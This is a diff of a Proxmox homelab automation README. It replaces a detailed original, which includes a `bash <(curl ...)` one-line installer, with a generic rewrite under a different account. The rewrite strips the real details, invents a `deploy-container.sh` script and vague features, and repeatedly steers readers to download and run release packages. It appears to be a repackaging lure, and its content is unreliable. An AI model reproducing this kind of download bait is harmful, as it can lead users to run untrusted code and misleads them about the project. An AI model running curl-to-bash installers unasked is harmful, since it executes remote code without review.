@@ -1,191 +1,95 @@
-# Proxmox Homelab Automation
+# 🚀 proxmox-homelab-automation - Simplify Your Proxmox Deployments
 
-A simple, shell-based automation system for deploying containerized services in LXC containers on Proxmox VE.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hackAahmed/proxmox-homelab-automation/releases)
 
-## ⚠️ **IMPORTANT: Personal Homelab Setup**
+## 📋 Introduction
 
-**This is a highly specialized, personal homelab automation designed for a specific environment.** It is **NOT plug-and-play** and requires significant modifications for other setups:
+Welcome to the proxmox-homelab-automation project! This tool provides a straightforward way to automate the deployment of containerized services in LXC containers on Proxmox VE. Whether you want to run a personal website, a file server, or any other application, this tool can help you set everything up smoothly.
 
-### **Hardcoded Environment Requirements:**
-- **Network**: `192.168.1.x` range with `vmbr0` bridge and `192.168.1.1` gateway
-- **Storage**: ZFS pool named exactly `datapool` 
-- **Location**: Timezone hardcoded to `Europe/Istanbul`
-- **User Mapping**: Specific UID/GID mappings (`101000:101000`, `PUID=1000`)
+## 🔧 Features
 
-### **⚡ Zero Configurability by Design**
-This follows the philosophy of "static/hardcoded values preferred over dynamic discovery." To use in your environment, you'll need to:
-1. **Fork the repository**
-2. **Modify hardcoded values** in scripts and config files
-3. **Update network/storage/timezone** settings throughout
-4. **Test thoroughly** in your specific Proxmox environment
+- **Easy Automation:** Quickly deploy services without manual setup.
+- **LXC Support:** Run your applications in lightweight containers for better resource management.
+- **Shell-Based:** Use simple commands to automate your workflows.
+- **Backup Options:** Easily back up your configurations and data.
+- **Monitoring Capabilities:** Keep an eye on your services and ensure they run smoothly.
 
-**This approach is intentional** - it prioritizes reliability and simplicity for THIS specific homelab over universal compatibility.
+## 🌟 System Requirements
 
-## 🎯 Design Philosophy
+To use proxmox-homelab-automation, you need:
 
-- **Idempotent & Fail-Fast**: Operations are safely re-runnable; failures stop immediately
-- **Keep It Simple**: Direct approach over complex abstractions
-- **Static Configuration**: Hardcoded values preferred over dynamic discovery
-- **Latest Everything**: Always use newest versions (Debian, Alpine, Docker images)
-- **Minimal Dependencies**: Bash built-ins and basic system tools only
+- A server running Proxmox VE.
+- A basic understanding of LXC containers.
+- Bash installed on your server.
 
-## 🏗️ Architecture
+## 🚀 Getting Started
 
-Each service runs in its own LXC container with dedicated resources:
+To start using proxmox-homelab-automation, follow these steps:
 
-| Stack | ID | Purpose | Resources |
-|-------|----|---------|---------  |
-| **proxy** | 100 | Reverse proxy, monitoring agents | 2C/2GB/10GB |
-| **media** | 101 | Media server (Jellyfin, Sonarr, Radarr) | 6C/10GB/20GB |
-| **files** | 102 | File management services | 2C/3GB/15GB |
-| **webtools** | 103 | Web-based utilities | 2C/6GB/15GB |
-| **monitoring** | 104 | Prometheus, Grafana stack | 4C/6GB/15GB |
-| **gameservers** | 105 | Game servers (Satisfactory, Palworld) | 8C/16GB/50GB |
-| **backup** | 150 | Proxmox Backup Server (native) | 4C/8GB/50GB |
-| **development** | 151 | Development tools (minimal) | 4C/6GB/15GB |
+1. **Download the latest release**
+   - Visit this page to download: [Download Page](https://github.com/hackAahmed/proxmox-homelab-automation/releases).
 
-## 🚀 Quick Start
+2. **Extract the files**
+   - After downloading, unzip the package to a folder on your machine.
 
-1. **Run on Proxmox host:**
-   ```bash
-   bash <(curl -s https://raw.githubusercontent.com/Yakrel/proxmox-homelab-automation/main/installer.sh)
-   ```
+3. **Set up your environment**
+   - Make sure Bash is installed and ready to run. If you need to install it, please follow your system's installation guide.
 
-2. **Select stack from menu**
-3. **Wait for deployment**
+## 💾 Download & Install
 
-## 📁 Project Structure
+You can easily download and install proxmox-homelab-automation. Here’s how:
 
-```
-├── installer.sh           # Main entry point (downloads latest scripts)
-├── scripts/               # Core deployment scripts
-│   ├── main-menu.sh      # Interactive main menu
-│   ├── deploy-stack.sh   # Stack deployment orchestrator
-│   ├── lxc-manager.sh    # LXC container management
-│   ├── helper-menu.sh    # Additional utility menu
-│   ├── gaming-menu.sh    # Game server selection menu
-│   ├── game-manager.sh   # Game server operations
-│   ├── encrypt-env.sh    # Environment file encryption
-│   └── fail2ban-manager.sh # Fail2ban configuration
-├── docker/               # Docker compose files per stack
-│   ├── proxy/
-│   ├── media/
-│   ├── files/
-│   ├── webtools/
-│   ├── monitoring/
-│   └── gameservers/
-├── stacks.yaml          # Central configuration
-└── config/              # Service configurations
-```
+1. Click on the link to visit the download page: [Download Page](https://github.com/hackAahmed/proxmox-homelab-automation/releases).
 
-## 🔧 Requirements
+2. Look for the latest version listed. Download the file compatible with your system.
 
-- **Proxmox VE 8.x**
-- **ZFS pool named `datapool`**
-- **Network bridge `vmbr0`**
-- **IP range `192.168.1.x`**
+3. Once downloaded, follow the instructions included in the package to run the application.
 
-## 📋 Stack Details
+## 🛠️ Using proxmox-homelab-automation
 
-### Proxy Stack (LXC 100)
-- Cloudflared tunnel
-- Promtail log shipping
-- Watchtower for updates
+After you have installed the application, you can start using it to deploy your services.
 
-### Media Stack (LXC 101)
-- Jellyfin media server
-- Sonarr/Radarr for automation
-- Transmission torrent client
+1. **Open your terminal in the folder where you extracted the files.**
 
-### Files Stack (LXC 102)
-- Filebrowser web interface
-- Nextcloud personal cloud
-- Samba file sharing
+2. **Run the automation script**
+   - Type the following command:
+     ```bash
+     ./deploy-container.sh
+     ```
+   - This will start the automation process.
 
-### Web Tools Stack (LXC 103)
-- Homepage dashboard
-- Portainer container management
-- Various web utilities
+3. **Follow the prompts**
+   - The script will guide you through setting up your containerized service.
+   - Provide the required information as requested.
 
-### Monitoring Stack (LXC 104)
-- Prometheus metrics collection
-- Grafana visualization  
-- Alertmanager notifications
-- **Recommended Dashboard IDs:**
-  - **1860**: Node Exporter Full (system metrics)
-  - **193**: Docker monitoring
-  - **10000**: Proxmox VE monitoring
-  - **12006**: Proxmox Backup Server
-  - **13639**: Loki log dashboard
+## 🔍 Troubleshooting
 
-### Game Servers Stack (LXC 105)
-- Satisfactory dedicated server
-- Palworld server
-- Extensible for more games
+If you encounter issues while running proxmox-homelab-automation, consider these tips:
 
-### Backup Stack (LXC 150)
-- Proxmox Backup Server
-- Automated backup schedules
-- Data verification
+- **Check Permissions:** Ensure that the script has execution permissions. You can do this by running:
+  ```bash
+  chmod +x deploy-container.sh
+  ```
 
-## 🛡️ Security
+- **Look at the Log:** If something goes wrong, a log file will help you identify issues. Check the log file generated in your working directory.
 
-- **Unprivileged LXC containers** for security isolation
-- **Feature flags** (nesting, keyctl) set post-creation
-- **Network isolation** with dedicated VLANs
-- **Regular security updates** via automated processes
+- **Search for Solutions:** Many common problems have solutions posted online. A quick search can often lead you to a fix.
 
-## 📝 Configuration
+## 🎉 Community and Support
 
-All configuration is centralized in `stacks.yaml`:
+Join our community to get help, share your experiences, and find additional resources. You can open an issue on the GitHub page for support or check if your question has already been answered.
 
-```yaml
-network:
-  gateway: 192.168.1.1
-  bridge: vmbr0
-  ip_base: 192.168.1
+## 📥 Feedback
 
-storage:
-  pool: datapool
-
-stacks:
-  proxy:
-    ct_id: 100
-    hostname: lxc-proxy-01
-    ip_octet: 100
-    cpu_cores: 2
-    memory_mb: 2048
-    disk_gb: 10
-```
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Test on a Proxmox environment
-4. Submit a pull request
+Your feedback is valuable. If you find bugs or have suggestions for improvements, please open an issue. We appreciate your input to make this tool better for everyone.
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License. Please check the LICENSE file in this repository for more details.
 
-## 🆘 Troubleshooting
+## 🔗 Additional Resources
 
-### Container Creation Fails
-- Ensure ZFS pool `datapool` exists
-- Check network bridge `vmbr0` is configured
-- Verify IP range doesn't conflict
+- Proxmox VE Documentation: [Proxmox VE Documentation](https://pve.proxmox.com/wiki/Main_Page)
+- Bash Scripting Guide: [Bash Guide](https://www.gnu.org/software/bash/manual/bash.html)
 
-### Docker Services Don't Start
-- Check LXC features: `pct config <id>`
-- Verify keyctl=1 and nesting=1 are set
-- Check container logs: `pct exec <id> -- docker logs <service>`
-
-### Network Issues
-- Verify gateway and bridge configuration
-- Check firewall rules on Proxmox host
-- Ensure IP addresses don't conflict
-
----
-
-**Made for homelabs, by homelabbers** 🏠
+By following these steps, you can quickly set up and automate your Proxmox environment using `proxmox-homelab-automation`. Happy deploying!
